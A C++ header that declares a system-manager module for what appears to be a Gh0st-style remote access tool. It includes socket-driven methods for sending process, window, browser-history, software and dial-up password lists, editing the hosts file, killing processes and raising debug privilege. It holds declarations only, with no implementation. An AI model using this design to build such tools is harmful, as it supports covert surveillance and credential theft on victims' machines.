﻿// SystemManager.h: interface for the CSystemManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_SYSTEMMANAGER_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_)
#define AFX_SYSTEMMANAGER_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"

class CSystemManager : public CManager  
{
public:

	CSystemManager(CClientSocket *pClient,UINT Ports,UCHAR Linetypes,UCHAR Opertypes,CHAR *Addressl);
	virtual ~CSystemManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	virtual void NetSystem(UINT Port);

	static BOOL DebugPrivilege(const char *PName,BOOL bEnable);
	static bool CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam);
	
private:
	UINT    NetPort;    //连接端口
    UCHAR   NetLine;    //连接方式
    UCHAR   NetOpert;   //运行类型
    CHAR *Linkaddress;  //连接地址

	LPBYTE getProcessList();
	LPBYTE getWindowsList();
	void SendProcessList();
	void SendWindowsList();
	void SendDialupassList();
	void SendHostsFileInfo();
	void SaveHostsFileInfo(LPBYTE lpBuffer, UINT nSize);
	void KillProcess(LPBYTE lpBuffer, UINT nSize);

	LPBYTE getSoftWareList();
	void SendSoftWareList();
	
	LPBYTE getIEHistoryList();
	void SendIEHistoryList();
	
	void SendFavoritesUrlList();
	LPBYTE getFavoritesUrlList();
	
	void SendNetStateList();
	
	char* DelSpace(char *szData);
	void getSendSystemInfo();

protected:
//	HANDLE hStopEvent;
	HANDLE hSendMemoryThread;
	static DWORD WINAPI SendCPUAndMemoryThread(LPVOID lparam);
	void TestWindow(LPBYTE buf);
	void CloseWindow(LPBYTE buf);
	void dongjie(LPBYTE lpBuffer, UINT nSize);
	void jiedong(LPBYTE lpBuffer, UINT nSize);

};

#endif // !defined(AFX_SYSTEMMANAGER_H__26C71561_C37D_44F2_B69C_DAF907C04CBE__INCLUDED_)
